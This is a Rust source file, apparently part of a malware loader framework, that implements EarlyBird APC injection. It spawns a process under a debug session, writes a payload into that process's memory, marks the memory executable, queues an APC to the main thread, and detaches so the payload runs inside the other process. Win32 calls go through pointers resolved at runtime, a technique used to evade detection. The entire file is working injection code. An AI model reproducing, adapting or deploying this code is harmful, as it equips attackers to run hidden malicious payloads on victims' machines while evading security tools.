//! EarlyBird APC injection — spawns a target process under DEBUG_ONLY_THIS_PROCESS,
//! writes the payload into its address space, queues an APC to the main thread,
//! then detaches the debugger so the process runs and the APC fires.
//!
//! Only compiled when the `early_bird` feature is enabled.

#![allow(dead_code, unused_imports, non_snake_case)]

use crate::types::*;

/// Inject `payload` into a freshly spawned `SPAWN_PROCESS` via APC early-bird.
///
/// Returns `true` on success, `false` on any failure.
///
/// # Safety
/// Calls Win32 APIs through resolved function pointers. All pointers must be
/// valid for the duration of this call. `G_API` must have been fully
/// initialized before calling this function.
pub unsafe fn inject(payload: &[u8]) -> bool {
    let mut state: bool = false;

    let mut pi: ProcessInformation = core::mem::zeroed();
    let mut si: StartupInfoW       = core::mem::zeroed();
    si.cb = core::mem::size_of::<StartupInfoW>() as u32;

    let mut old_protect: u32 = 0u32;
    let mut bytes_written: usize = 0usize;

    // Spawn the target process suspended under a debug session.
    // SPAWN_PROCESS is a null-terminated wide string from the generated module.
    let ok = (crate::inject::G_API.create_process_w.unwrap())(
        core::ptr::null(),                      // lpApplicationName  (NULL)
        crate::generated::SPAWN_PROCESS.as_ptr() as *mut u16, // lpCommandLine
        core::ptr::null_mut(),                  // lpProcessAttributes
        core::ptr::null_mut(),                  // lpThreadAttributes
        0,                                      // bInheritHandles (FALSE)
        DEBUG_ONLY_THIS_PROCESS | DETACHED_PROCESS, // dwCreationFlags
        core::ptr::null_mut(),                  // lpEnvironment
        core::ptr::null(),                      // lpCurrentDirectory
        &mut si as *mut StartupInfoW as *mut u8,
        &mut pi as *mut ProcessInformation as *mut u8,
    );
    if ok == 0 {
        return false;
    }

    let h_process = pi.h_process;
    let h_thread  = pi.h_thread;

    // Allocate RW memory in the target process for the payload.
    let p_address = (crate::inject::G_API.virtual_alloc_ex.unwrap())(
        h_process,
        core::ptr::null_mut(),
        payload.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if p_address.is_null() {
        goto_end(h_thread, h_process, state);
        return state;
    }

    // Write the payload bytes.
    let wrote = (crate::inject::G_API.write_process_memory.unwrap())(
        h_process,
        p_address,
        payload.as_ptr(),
        payload.len(),
        &mut bytes_written,
    );
    if wrote == 0 {
        goto_end(h_thread, h_process, state);
        return state;
    }

    // Change protection to RWX so the APC stub can execute.
    let protected = (crate::inject::G_API.virtual_protect_ex.unwrap())(
        h_process,
        p_address,
        payload.len(),
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    );
    if protected == 0 {
        goto_end(h_thread, h_process, state);
        return state;
    }

    // Queue the APC to the main thread — fires when the thread enters an
    // alertable wait state after the debugger detaches.
    let queued = (crate::inject::G_API.queue_user_apc.unwrap())(
        p_address as usize,  // pfnAPC  (cast to usize = function pointer)
        h_thread,
        0,                   // dwData (NULL)
    );
    if queued == 0 {
        goto_end(h_thread, h_process, state);
        return state;
    }

    // Detach the debugger — the process resumes and the APC fires.
    (crate::inject::G_API.debug_active_process_stop.unwrap())(pi.dw_process_id);

    state = true;

    goto_end(h_thread, h_process, state);
    state
}

/// Common cleanup: always close the thread handle; close the process handle
/// only on failure (on success the process continues running).
#[inline(always)]
unsafe fn goto_end(h_thread: HANDLE, h_process: HANDLE, state: bool) {
    if !h_thread.is_null() {
        (crate::inject::G_API.close_handle.unwrap())(h_thread);
    }
    if !h_process.is_null() && !state {
        (crate::inject::G_API.close_handle.unwrap())(h_process);
    }
}
